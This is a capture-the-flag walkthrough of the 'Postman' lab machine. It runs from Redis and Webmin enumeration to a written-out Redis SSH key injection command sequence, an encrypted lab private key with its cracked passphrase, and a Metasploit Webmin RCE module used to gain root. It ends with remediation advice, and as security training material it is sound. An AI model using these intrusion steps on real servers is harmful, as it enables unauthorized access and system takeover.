
# Walkthrough 


## Information Gathering 


Target IP successfully resolves to a webpage:

![](postman_webpage.png)

Closing the dialogue will reveal a mouse icon and clicking it changes the URL to:

```
http://10.129.45.150/#first-section
```

postman@htb is potentially a username to be used. 

### Nmap Scans: 

All port scan: 
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
```


-sC -sV scan on the ports above: 
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


#### Port 6379:

Port 6379 is the default TCP port for Redis, an open-source, in-memory database and caching system. It is used for standard client-server communication, allowing applications to store, retrieve, and manage data.

Because it is widely targeted by attackers, you should never expose port 6379 to the public internet. To secure it, restrict access to trusted IP addresses using a firewall or Security Group, enable Protected Mode, and set a strong authentication password

https://hackviser.com/tactics/pentesting/services/redis  -  resource for pentesting Redis

A connection to the Redis server was successful. 


#### Port 10000:

Port 10000 is primarily used as the default port for Webmin (a web-based system administration tool for Linux/Unix) and as the default listening port for Render web services. 

![](postman_10000webmin.png)

http://target:10000 redirected us to https://target:10000 and revealed the login page above. 

Credentials need to be obtained, it is possible that these can be retrieved from the service running on port 6379. 


## Exploitation:

First, enumerate the Redis service to find out if we have access. Then, enumerate for write access on the machine:
##### Enumerating Redis:

###### Netcat Redis:

`config get *` results:
```
config get *
*178
$10
dbfilename
$8
dump.rdb
$11
requirepass
$0

$10
masterauth
$0

$19
cluster-announce-ip
$0

$10
unixsocket
$0

$7
logfile
$31
/var/log/redis/redis-server.log
$7
pidfile
$31
/var/run/redis/redis-server.pid
$17
slave-announce-ip
$0

$9
maxmemory
$1
0
$18
proto-max-bulk-len
$9
536870912
$25
client-query-buffer-limit
$10
1073741824
$17
maxmemory-samples
$1
5
$14
lfu-log-factor
$2
10
$14
lfu-decay-time
$1
1
$7
timeout
$1
0
$29
active-defrag-threshold-lower
$2
10
$29
active-defrag-threshold-upper
$3
100
$26
active-defrag-ignore-bytes
$9
104857600
$23
active-defrag-cycle-min
$2
25
$23
active-defrag-cycle-max
$2
75
$27
auto-aof-rewrite-percentage
$3
100
$25
auto-aof-rewrite-min-size
$8
67108864
$24
hash-max-ziplist-entries
$3
512
$22
hash-max-ziplist-value
$2
64
$21
list-max-ziplist-size
$2
-2
$19
list-compress-depth
$1
0
$22
set-max-intset-entries
$3
512
$24
zset-max-ziplist-entries
$3
128
$22
zset-max-ziplist-value
$2
64
$20
hll-sparse-max-bytes
$4
3000
$14
lua-time-limit
$4
5000
$23
slowlog-log-slower-than
$5
10000
$25
latency-monitor-threshold
$1
0
$15
slowlog-max-len
$3
128
$4
port
$4
6379
$21
cluster-announce-port
$1
0
$25
cluster-announce-bus-port
$1
0
$11
tcp-backlog
$3
511
$9
databases
$2
16
$22
repl-ping-slave-period
$2
10
$12
repl-timeout
$2
60
$17
repl-backlog-size
$7
1048576
$16
repl-backlog-ttl
$4
3600
$10
maxclients
$5
10000
$15
watchdog-period
$1
0
$14
slave-priority
$3
100
$19
slave-announce-port
$1
0
$19
min-slaves-to-write
$1
0
$18
min-slaves-max-lag
$2
10
$2
hz
$2
10
$20
cluster-node-timeout
$5
15000
$25
cluster-migration-barrier
$1
1
$29
cluster-slave-validity-factor
$2
10
$24
repl-diskless-sync-delay
$1
5
$13
tcp-keepalive
$3
300
$29
cluster-require-full-coverage
$3
yes
$25
cluster-slave-no-failover
$2
no
$25
no-appendfsync-on-rewrite
$2
no
$22
slave-serve-stale-data
$3
yes
$15
slave-read-only
$3
yes
$27
stop-writes-on-bgsave-error
$3
yes
$9
daemonize
$3
yes
$14
rdbcompression
$3
yes
$11
rdbchecksum
$3
yes
$15
activerehashing
$3
yes
$12
activedefrag
$2
no
$14
protected-mode
$2
no
$24
repl-disable-tcp-nodelay
$2
no
$18
repl-diskless-sync
$2
no
$29
aof-rewrite-incremental-fsync
$3
yes
$18
aof-load-truncated
$3
yes
$20
aof-use-rdb-preamble
$2
no
$22
lazyfree-lazy-eviction
$2
no
$20
lazyfree-lazy-expire
$2
no
$24
lazyfree-lazy-server-del
$2
no
$16
slave-lazy-flush
$2
no
$16
maxmemory-policy
$10
noeviction
$8
loglevel
$6
notice
$10
supervised
$2
no
$11
appendfsync
$8
everysec
$15
syslog-facility
$6
local0
$10
appendonly
$2
no
$3
dir
$14
/var/lib/redis
$4
save
$21
900 1 300 10 60 10000
$26
client-output-buffer-limit
$67
normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60
$14
unixsocketperm
$1
0
$7
slaveof
$0

$22
notify-keyspace-events
$0

$4
bind
$11
0.0.0.0 ::1
```


dump.rdb appears to a name for the database.

Metasploit has a scanner that can be used against the target. Findings are below:

###### Metasploit Redis Scanner:

```
msf auxiliary(scanner/redis/redis_server) > run
[+] 10.129.45.150:6379    - Found redis with INFO command
Server
======

  Key                Value
  ---                -----
  arch_bits          64
  atomicvar_api      atomic-builtin
  config_file        /etc/redis/redis.conf
  executable         /usr/bin/redis-server
  gcc_version        7.4.0
  hz                 10
  lru_clock          6342687
  multiplexing_api   epoll
  os                 Linux 4.15.0-58-generic x86_64
  process_id         642
  redis_build_id     9435c3c2879311f3
  redis_git_dirty    0
  redis_git_sha1     00000000
  redis_mode         standalone
  redis_version      4.0.9
  run_id             79ffc7d4b8d7d0b66779835e450b09ddd3c8ffbd
  tcp_port           6379
  uptime_in_days     0
  uptime_in_seconds  1831

Clients
=======

  Key                         Value
  ---                         -----
  blocked_clients             0
  client_biggest_input_buf    0
  client_longest_output_list  0
  connected_clients           1

Memory
======

  Key                        Value
  ---                        -----
  active_defrag_running      0
  lazyfree_pending_objects   0
  maxmemory                  0
  maxmemory_human            0B
  maxmemory_policy           noeviction
  mem_allocator              jemalloc-3.6.0
  mem_fragmentation_ratio    4.57
  total_system_memory        941203456
  total_system_memory_human  897.60M
  used_memory                841240
  used_memory_dataset        9154
  used_memory_dataset_perc   15.57%
  used_memory_human          821.52K
  used_memory_lua            37888
  used_memory_lua_human      37.00K
  used_memory_overhead       832086
  used_memory_peak           841240
  used_memory_peak_human     821.52K
  used_memory_peak_perc      100.00%
  used_memory_rss            3842048
  used_memory_rss_human      3.66M
  used_memory_startup        782456

Persistence
===========

  Key                           Value
  ---                           -----
  aof_current_rewrite_time_sec  -1
  aof_enabled                   0
  aof_last_bgrewrite_status     ok
  aof_last_cow_size             0
  aof_last_rewrite_time_sec     -1
  aof_last_write_status         ok
  aof_rewrite_in_progress       0
  aof_rewrite_scheduled         0
  loading                       0
  rdb_bgsave_in_progress        0
  rdb_changes_since_last_save   0
  rdb_current_bgsave_time_sec   -1
  rdb_last_bgsave_status        ok
  rdb_last_bgsave_time_sec      -1
  rdb_last_cow_size             0
  rdb_last_save_time            1784725752

Stats
=====

  Key                             Value
  ---                             -----
  active_defrag_hits              0
  active_defrag_key_hits          0
  active_defrag_key_misses        0
  active_defrag_misses            0
  evicted_keys                    0
  expired_keys                    0
  expired_stale_perc              0.00
  expired_time_cap_reached_count  0
  instantaneous_input_kbps        0.00
  instantaneous_ops_per_sec       0
  instantaneous_output_kbps       0.00
  keyspace_hits                   0
  keyspace_misses                 0
  latest_fork_usec                0
  migrate_cached_sockets          0
  pubsub_channels                 0
  pubsub_patterns                 0
  rejected_connections            0
  slave_expires_tracked_keys      0
  sync_full                       0
  sync_partial_err                0
  sync_partial_ok                 0
  total_commands_processed        8
  total_connections_received      5
  total_net_input_bytes           803
  total_net_output_bytes          8877

Replication
===========

  Key                             Value
  ---                             -----
  connected_slaves                0
  master_repl_offset              0
  master_replid                   fe14252367e9a070bcf51bc5db93bfe457a30b9e
  master_replid2                  0000000000000000000000000000000000000000
  repl_backlog_active             0
  repl_backlog_first_byte_offset  0
  repl_backlog_histlen            0
  repl_backlog_size               1048576
  role                            master
  second_repl_offset              -1

CPU
===

  Key                     Value
  ---                     -----
  used_cpu_sys            1.02
  used_cpu_sys_children   0.00
  used_cpu_user           0.39
  used_cpu_user_children  0.00

Cluster
=======

  Key              Value
  ---              -----
  cluster_enabled  0


[*] 10.129.45.150:6379    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### SSH Key Injection:

This article provides a breakdown of writing a SSH key onto the machine. This is possible due to `Redis` not being password protected and granting write access to an unauthorised user:

Here's the process for this particular machine:

```
# Generate SSH key
ssh-keygen -t rsa -f redis_key

# Prepare key with newlines
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Inject into authorized_keys
redis-cli -h target.com flushall
cat key.txt | redis-cli -h target.com -x set ssh_key
redis-cli -h target.com config set dbfilename authorized_keys
redis-cli -h target.com config set dir /var/lib/redis/.ssh/
redis-cli -h target.com save
```



![](postman_sshaccess.png)

Initial access is obtained but the first flag in the /home/Matt directory cannot be read due to permissions.


## Privilege Escalation 

`cat /var/lib/redlis/.bash_history`
```
exit
su Matt
pwd
nano scan.py
python scan.py
nano scan.py
clear
nano scan.py
clear
python scan.py
exit
exit
cat /etc/ssh/sshd_config
su Matt
clear
cd /var/lib/redis
su Matt
exit
cat id_rsa.bak
ls -la
exit
cat id_rsa.bak
exit
ls -la
crontab -l
systemctl enable redis-server
redis-server
ifconfig
netstat -a
netstat -a
netstat -a
netstat -a
netstat -a > txt
exit
crontab -l
cd ~/
ls
nano 6379
exit
```


```
redis@Postman:/$ cd opt
redis@Postman:/opt$ cat id_rsa.bak                                                                    -----BEGIN RSA PRIVATE KEY-----                                                                       Proc-Type: 4,ENCRYPTED                                                                                DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
                                                               JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Using `ssh2john`, we find the password for this is `computer2008`. 

However, when we use the key to connect to the user Matt and enter the password, the connection is immediately dropped. 

This is due to the ssh config file being set to not allow the Matt user to ssh in to the machine with either a password or a private key. 

However, because we already gained initial access via the `Redis SSH Key Injection`  we can attempt to reuse the credentials we found to su Matt when already inside the machine: 

![](postman_sumatt.png)


## Privilege Escalation: Matt > root


```
Matt@Postman:/$ sudo -l
[sudo] password for Matt:
Sorry, user Matt may not run sudo on Postman.
```


```
Matt@Postman:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

#
```

The target is running a vulnerable version of Webmin (1.910) and is vulnerable to an RCE exploit. The module on Metasploit is called 

```
exploit/linux/http/webmin_packageup_rce
```

By using the credentials for Matt that were found, we can utilise this explain to gain root on the target machine. 

When configuring the payload, it is important to set `SSL to true` as the webmin service is hosted on `https`. 

If configured the correctly, the exploit will work and grant a root shell:

![](postman_metasploit.png)


![](postman_rootshell.png)



# Summary: 

The penetration test identified multiple exposed services including SSH, Apache HTTP, Redis, and Webmin. Initial reconnaissance revealed a misconfigured `Redis 4.0.9` instance running without authentication and with unrestricted network access, allowing unauthorised interaction and write access. This vulnerability was exploited through Redis SSH key injection, enabling an attacker to write an SSH public key into the Redis user's `.ssh/authorized_keys` file and obtain initial access to the target system. 

Post-exploitation enumeration uncovered sensitive files, including an encrypted RSA private key backup belonging to the Matt user. The key was recovered using password cracking techniques, and although direct SSH access was restricted through SSH configuration, the recovered credentials allowed local privilege transition to the Matt account. 

Further enumeration identified a vulnerable `Webmin 1.910` installation running on `port 10000`. Exploitation of the Webmin Package Updates RCE vulnerability using valid Matt credentials provided remote code execution as root, resulting in full system compromise. 

The assessment demonstrated the impact of insecure Redis configuration, exposed administrative services, weak credential management, and outdated software components. Key recommendations include restricting Redis exposure, enabling authentication and protected mode, removing sensitive credentials and private keys from accessible locations, enforcing secure SSH configurations, and upgrading Webmin to a patched version.








